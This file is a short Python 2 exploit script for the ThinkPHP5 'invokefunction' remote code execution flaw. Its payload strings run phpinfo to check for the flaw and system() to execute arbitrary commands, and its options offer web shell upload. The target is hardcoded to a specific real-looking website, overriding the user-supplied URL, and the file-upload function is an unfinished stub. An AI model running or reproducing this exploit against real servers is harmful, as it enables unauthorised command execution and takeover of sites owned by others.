#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019-04-18 14:11
# @Author  : Stardustsky
# @File    : exp.py
# @Software: PyCharm
import optparse
import urllib
import base64


VERSION = 1.0
ThinkPHP5 = {
    "test": "/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "exec": "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="
}


def vul_check(url):
    # payload = dict()
    # payload['5'] = '/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
    url = url+ThinkPHP5['test']
    res = urllib.urlopen(url)
    res_body = res.read()
    if res_body.find("PHP Version") != -1:
        print "ThinkPHP5 vul is exist."
    else:
        print "ThinkPHP5 vul not exist."


def exec_command(url, command):
    url = url+ThinkPHP5['exec']+command
    res = urllib.urlopen(url)
    print res.readlines()[0]


def file_upload(url, file):
    payload = dict()
    payload['5'] = "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="



def center(opt):
    opt.url = "https://bei.9jm9.com"
    if opt.url:
        vul_check(opt.url)
        if opt.command:
            exec_command(opt.url, opt.command)
        if opt.file:
            file_upload(opt.url, opt.command)



if __name__ == '__main__':
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. -u http://www.target.com/)")
    parser.add_option("-e", dest="command", help="Execute command (e.g -e whoami)")
    parser.add_option("-f", dest="file", help="Upload file to server (e.g -f shell.php)")
    options, _ = parser.parse_args()
    center(options)

